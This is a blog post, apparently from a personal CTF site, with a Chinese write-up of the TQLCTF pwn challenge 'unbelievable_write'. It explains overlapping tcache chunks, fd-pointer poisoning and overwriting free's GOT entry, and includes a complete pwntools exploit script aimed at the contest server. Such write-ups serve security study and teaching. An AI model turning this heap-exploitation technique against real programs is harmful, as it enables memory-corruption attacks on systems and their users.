{"title":"[TQLCTF]Pwn Tunbelievable_write wp","date":"2022-02-21T02:08:13.000Z","toc":true,"source":"_posts/TqlCTF-unbelievable-write.md","raw":"---\ntitle: \"[TQLCTF]Pwn Tunbelievable_write wp\"\ncomments: true\ntoc: true\ndate: 2022-02-21 10:08:13\ntags: \n  - CTF\n  - Pwn\n  - TQLCTF\n---\n\n# 题目\n\n https://gitee.com/csomebro/ctftask/blob/master/2022-02_TQLCTF/unbelievable_write.zip\n\n# 解题\n\nChecksec发现没开PIE\n\n![image-20220221101153302](TqlCTF-unbelievable-write/image-20220221101153302.png)\n\nIDA检查，主要逻辑就是三个函数c1 c2 c3\n\n![image-20220221101252539](TqlCTF-unbelievable-write/image-20220221101252539.png)\n\n![image-20220221101304998](TqlCTF-unbelievable-write/image-20220221101304998.png)\n\n![image-20220221101314111](TqlCTF-unbelievable-write/image-20220221101314111.png)\n\n发现只要修改target的值就可以得到flag\n\n![image-20220221101415508](TqlCTF-unbelievable-write/image-20220221101415508.png)\n\n在c2中可以伪造一个堆的chunk到tcache bin中，实现堆块堆叠，之后可以修改物理地址相邻的下一个堆块的fd指针，实现任意位置写（题目附件给了Dockerflie，使用Ubuntu20.04起的docker）\n\n在gdb调试中会发现target上方就是got表，直接伪造在target上伪造chunk在从c1中能够申请但free时会报错，过不了_int_free中的检验，解决方法就是修改free的got表，让他不要free不就行了hhhh，即在tcache中布置好两个伪造的堆块，一个用于修改free_got，一个用于修改target，由于不需要free了，堆块的地址也不需要16位对齐了。\n\n# Exp\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'debug'\n# io = process('./pwn')\nio = remote('119.23.255.127', 21334)\n\ndef c1(size, content):\n    io.sendlineafter('> ', '1')\n    io.sendline(str(size))\n    io.sendline(content)\n\ndef c11(size, content):\n    io.sendlineafter('> ', '1')\n    io.sendline(str(size))\n    io.send(content)\n\ndef c2(offset):\n    io.sendlineafter('> ', '2')\n    io.sendline(str(offset))\n\ndef c3():\n    io.sendlineafter('> ', '3')\n\n# c2(0x0404080)\nc1(0x40, 'aaa') \nc1(0x50, 'bbb') \n# 申请0x40和0x50堆块并直接进入tcache,其中0x50的堆块就是我要劫持的堆块，下文叫做vulnchunk \np = 'a' * 0x10 + p64(0) + p64(0x200)\nc1(0x40, p)  # 此时申请的0x40堆块就是之前的那个，写入fakechunk的头，fakechunk大小为0x1f0\nc2(0x40) # 计算偏移到fakechunk的地址，构造堆块堆叠\nc1(0x80, 'aaa') # 先在tcache[0x80]位置放入一个堆块\np = 'a' * 0x20 + p64(0) + p64(0x91) + p64(0x0000404080) # 修改vulnchunk的size为0x91\nc1(0x1f0, p) \nc1(0x50, 'aaa') # 将vulnchunk申请出来，并立马free掉，此时会放入tcache[0x80]的位置\n# 此时tcache[0x80]位置会有两个堆块，[0x80] -> vulnchunk -> normalchunk\np = 'a' * 0x20 + p64(0) + p64(0xa1) + p64(0x404018) \nc1(0x1f0, p)\n# 修改vuln再次修改size为，0xa1，并篡改fd指针为目标写入地址，此时0x404018是free_got地址\n# 此时的tcache[0x80] -> vulnchunk -> free_got chunk\n\nc1(0x90, 'aaa') # 在0x90中先放一个堆块后续会用到\nc1(0x80, 'aaa') # 将vulnchunk申请出来，free之后会放入tcache[0x90]位置\n# 此时tcache[0x90] -> vulnchunk -> normal chunk\n# 此时tcache[0x80] -> free_got chun，即下一个0x80的堆块就是free_got地址的堆块\np = p64(0x00401418) + p64(0x401040) + p64(0x401050)\nc1(0x80, p) \n# 将free_got内容写为c3函数地址，并复原下面一部分got表\n#由于结尾需要一个\\n，我就把\\n放到了__stack_check_fail的got表中了（反正也不会执行\np = 'a' * 0x20 + p64(0) + p64(0xb1) + p64(0x404080)\nc1(0x1f0, p)\n# 重复上述修改vulnchunk fd指针操作，将target地址写入\n# 此时tcache[0x90] -> vulnchunk -> target\nc1(0x90, 'aaa') # 将vulnchunk取出，此时tcache[0x90] -> target\nc1(0x90, 'aaa') # 将target取出，并修改其中的值，由于free_got中是c3函数，所以会自动调用使其打印出flag\n\nio.interactive()\n```\n","slug":"TqlCTF-unbelievable-write","published":true,"updated":"2025-10-28T08:00:40.759Z","_id":"cuidka_o2XzstorH3qLryb5c-","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p> <a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-02_TQLCTF/unbelievable_write.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-02_TQLCTF/unbelievable_write.zip</a></p>\n<h1 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h1><p>Checksec发现没开PIE</p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101153302.png\" alt=\"image-20220221101153302\"></p>\n<p>IDA检查，主要逻辑就是三个函数c1 c2 c3</p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101252539.png\" alt=\"image-20220221101252539\"></p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101304998.png\" alt=\"image-20220221101304998\"></p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101314111.png\" alt=\"image-20220221101314111\"></p>\n<p>发现只要修改target的值就可以得到flag</p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101415508.png\" alt=\"image-20220221101415508\"></p>\n<p>在c2中可以伪造一个堆的chunk到tcache bin中，实现堆块堆叠，之后可以修改物理地址相邻的下一个堆块的fd指针，实现任意位置写（题目附件给了Dockerflie，使用Ubuntu20.04起的docker）</p>\n<p>在gdb调试中会发现target上方就是got表，直接伪造在target上伪造chunk在从c1中能够申请但free时会报错，过不了_int_free中的检验，解决方法就是修改free的got表，让他不要free不就行了hhhh，即在tcache中布置好两个伪造的堆块，一个用于修改free_got，一个用于修改target，由于不需要free了，堆块的地址也不需要16位对齐了。</p>\n<h1 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;119.23.255.127&#x27;</span>, <span class=\"number\">21334</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">c1</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">c11</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">c2</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">c3</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># c2(0x0404080)</span></span><br><span class=\"line\">c1(<span class=\"number\">0x40</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) </span><br><span class=\"line\">c1(<span class=\"number\">0x50</span>, <span class=\"string\">&#x27;bbb&#x27;</span>) </span><br><span class=\"line\"><span class=\"comment\"># 申请0x40和0x50堆块并直接进入tcache,其中0x50的堆块就是我要劫持的堆块，下文叫做vulnchunk </span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x200</span>)</span><br><span class=\"line\">c1(<span class=\"number\">0x40</span>, p)  <span class=\"comment\"># 此时申请的0x40堆块就是之前的那个，写入fakechunk的头，fakechunk大小为0x1f0</span></span><br><span class=\"line\">c2(<span class=\"number\">0x40</span>) <span class=\"comment\"># 计算偏移到fakechunk的地址，构造堆块堆叠</span></span><br><span class=\"line\">c1(<span class=\"number\">0x80</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 先在tcache[0x80]位置放入一个堆块</span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(<span class=\"number\">0x0000404080</span>) <span class=\"comment\"># 修改vulnchunk的size为0x91</span></span><br><span class=\"line\">c1(<span class=\"number\">0x1f0</span>, p) </span><br><span class=\"line\">c1(<span class=\"number\">0x50</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 将vulnchunk申请出来，并立马free掉，此时会放入tcache[0x80]的位置</span></span><br><span class=\"line\"><span class=\"comment\"># 此时tcache[0x80]位置会有两个堆块，[0x80] -&gt; vulnchunk -&gt; normalchunk</span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xa1</span>) + p64(<span class=\"number\">0x404018</span>) </span><br><span class=\"line\">c1(<span class=\"number\">0x1f0</span>, p)</span><br><span class=\"line\"><span class=\"comment\"># 修改vuln再次修改size为，0xa1，并篡改fd指针为目标写入地址，此时0x404018是free_got地址</span></span><br><span class=\"line\"><span class=\"comment\"># 此时的tcache[0x80] -&gt; vulnchunk -&gt; free_got chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">c1(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 在0x90中先放一个堆块后续会用到</span></span><br><span class=\"line\">c1(<span class=\"number\">0x80</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 将vulnchunk申请出来，free之后会放入tcache[0x90]位置</span></span><br><span class=\"line\"><span class=\"comment\"># 此时tcache[0x90] -&gt; vulnchunk -&gt; normal chunk</span></span><br><span class=\"line\"><span class=\"comment\"># 此时tcache[0x80] -&gt; free_got chun，即下一个0x80的堆块就是free_got地址的堆块</span></span><br><span class=\"line\">p = p64(<span class=\"number\">0x00401418</span>) + p64(<span class=\"number\">0x401040</span>) + p64(<span class=\"number\">0x401050</span>)</span><br><span class=\"line\">c1(<span class=\"number\">0x80</span>, p) </span><br><span class=\"line\"><span class=\"comment\"># 将free_got内容写为c3函数地址，并复原下面一部分got表</span></span><br><span class=\"line\"><span class=\"comment\">#由于结尾需要一个\\n，我就把\\n放到了__stack_check_fail的got表中了（反正也不会执行</span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xb1</span>) + p64(<span class=\"number\">0x404080</span>)</span><br><span class=\"line\">c1(<span class=\"number\">0x1f0</span>, p)</span><br><span class=\"line\"><span class=\"comment\"># 重复上述修改vulnchunk fd指针操作，将target地址写入</span></span><br><span class=\"line\"><span class=\"comment\"># 此时tcache[0x90] -&gt; vulnchunk -&gt; target</span></span><br><span class=\"line\">c1(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 将vulnchunk取出，此时tcache[0x90] -&gt; target</span></span><br><span class=\"line\">c1(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 将target取出，并修改其中的值，由于free_got中是c3函数，所以会自动调用使其打印出flag</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<h1 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h1><p> <a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-02_TQLCTF/unbelievable_write.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-02_TQLCTF/unbelievable_write.zip</a></p>\n<h1 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h1><p>Checksec发现没开PIE</p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101153302.png\" alt=\"image-20220221101153302\"></p>\n<p>IDA检查，主要逻辑就是三个函数c1 c2 c3</p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101252539.png\" alt=\"image-20220221101252539\"></p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101304998.png\" alt=\"image-20220221101304998\"></p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101314111.png\" alt=\"image-20220221101314111\"></p>\n<p>发现只要修改target的值就可以得到flag</p>\n<p><img src=\"/p/TqlCTF-unbelievable-write/image-20220221101415508.png\" alt=\"image-20220221101415508\"></p>\n<p>在c2中可以伪造一个堆的chunk到tcache bin中，实现堆块堆叠，之后可以修改物理地址相邻的下一个堆块的fd指针，实现任意位置写（题目附件给了Dockerflie，使用Ubuntu20.04起的docker）</p>\n<p>在gdb调试中会发现target上方就是got表，直接伪造在target上伪造chunk在从c1中能够申请但free时会报错，过不了_int_free中的检验，解决方法就是修改free的got表，让他不要free不就行了hhhh，即在tcache中布置好两个伪造的堆块，一个用于修改free_got，一个用于修改target，由于不需要free了，堆块的地址也不需要16位对齐了。</p>\n<h1 id=\"Exp\"><a href=\"#Exp\" class=\"headerlink\" title=\"Exp\"></a>Exp</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;119.23.255.127&#x27;</span>, <span class=\"number\">21334</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">c1</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">c11</span>(<span class=\"params\">size, content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">c2</span>(<span class=\"params\">offset</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">c3</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># c2(0x0404080)</span></span><br><span class=\"line\">c1(<span class=\"number\">0x40</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) </span><br><span class=\"line\">c1(<span class=\"number\">0x50</span>, <span class=\"string\">&#x27;bbb&#x27;</span>) </span><br><span class=\"line\"><span class=\"comment\"># 申请0x40和0x50堆块并直接进入tcache,其中0x50的堆块就是我要劫持的堆块，下文叫做vulnchunk </span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x200</span>)</span><br><span class=\"line\">c1(<span class=\"number\">0x40</span>, p)  <span class=\"comment\"># 此时申请的0x40堆块就是之前的那个，写入fakechunk的头，fakechunk大小为0x1f0</span></span><br><span class=\"line\">c2(<span class=\"number\">0x40</span>) <span class=\"comment\"># 计算偏移到fakechunk的地址，构造堆块堆叠</span></span><br><span class=\"line\">c1(<span class=\"number\">0x80</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 先在tcache[0x80]位置放入一个堆块</span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(<span class=\"number\">0x0000404080</span>) <span class=\"comment\"># 修改vulnchunk的size为0x91</span></span><br><span class=\"line\">c1(<span class=\"number\">0x1f0</span>, p) </span><br><span class=\"line\">c1(<span class=\"number\">0x50</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 将vulnchunk申请出来，并立马free掉，此时会放入tcache[0x80]的位置</span></span><br><span class=\"line\"><span class=\"comment\"># 此时tcache[0x80]位置会有两个堆块，[0x80] -&gt; vulnchunk -&gt; normalchunk</span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xa1</span>) + p64(<span class=\"number\">0x404018</span>) </span><br><span class=\"line\">c1(<span class=\"number\">0x1f0</span>, p)</span><br><span class=\"line\"><span class=\"comment\"># 修改vuln再次修改size为，0xa1，并篡改fd指针为目标写入地址，此时0x404018是free_got地址</span></span><br><span class=\"line\"><span class=\"comment\"># 此时的tcache[0x80] -&gt; vulnchunk -&gt; free_got chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">c1(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 在0x90中先放一个堆块后续会用到</span></span><br><span class=\"line\">c1(<span class=\"number\">0x80</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 将vulnchunk申请出来，free之后会放入tcache[0x90]位置</span></span><br><span class=\"line\"><span class=\"comment\"># 此时tcache[0x90] -&gt; vulnchunk -&gt; normal chunk</span></span><br><span class=\"line\"><span class=\"comment\"># 此时tcache[0x80] -&gt; free_got chun，即下一个0x80的堆块就是free_got地址的堆块</span></span><br><span class=\"line\">p = p64(<span class=\"number\">0x00401418</span>) + p64(<span class=\"number\">0x401040</span>) + p64(<span class=\"number\">0x401050</span>)</span><br><span class=\"line\">c1(<span class=\"number\">0x80</span>, p) </span><br><span class=\"line\"><span class=\"comment\"># 将free_got内容写为c3函数地址，并复原下面一部分got表</span></span><br><span class=\"line\"><span class=\"comment\">#由于结尾需要一个\\n，我就把\\n放到了__stack_check_fail的got表中了（反正也不会执行</span></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xb1</span>) + p64(<span class=\"number\">0x404080</span>)</span><br><span class=\"line\">c1(<span class=\"number\">0x1f0</span>, p)</span><br><span class=\"line\"><span class=\"comment\"># 重复上述修改vulnchunk fd指针操作，将target地址写入</span></span><br><span class=\"line\"><span class=\"comment\"># 此时tcache[0x90] -&gt; vulnchunk -&gt; target</span></span><br><span class=\"line\">c1(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 将vulnchunk取出，此时tcache[0x90] -&gt; target</span></span><br><span class=\"line\">c1(<span class=\"number\">0x90</span>, <span class=\"string\">&#x27;aaa&#x27;</span>) <span class=\"comment\"># 将target取出，并修改其中的值，由于free_got中是c3函数，所以会自动调用使其打印出flag</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n","path":"/p/TqlCTF-unbelievable-write/","permalink":"https://blog.csome.cc/p/TqlCTF-unbelievable-write/","tags":[{"name":"CTF","_id":"cuidvZ3AUibcKOkbkNEMC3ltU","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuid9EjKHYI0JNtcQl-odZaE8","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"TQLCTF","_id":"cuidQVsaii1Th6yy_4rEJKnxK","slug":"TQLCTF","path":"tags/TQLCTF/","permalink":"https://blog.csome.cc/tags/TQLCTF/","length":1}],"categories":[],"prev":{"title":"SUSCTF pwn wp","date":"2022-03-01T07:46:32.000Z","slug":"SUSCTF-wp","published":true,"updated":"2025-10-28T08:00:40.756Z","_id":"cuidts4DncG5fOCHjVB1BR8J9","layout":"post","photos":[],"excerpt":"","path":"/p/SUSCTF-wp/","permalink":"https://blog.csome.cc/p/SUSCTF-wp/","__post":true},"next":{"title":"二维计算几何模板","date":"2021-12-14T05:59:50.000Z","slug":"cg-template","published":true,"updated":"2025-10-28T08:00:40.764Z","_id":"cuidnrc10fP23LwfrlhYiHgq-","layout":"post","photos":[],"excerpt":"","path":"/p/cg-template/","permalink":"https://blog.csome.cc/p/cg-template/","__post":true},"__post":true}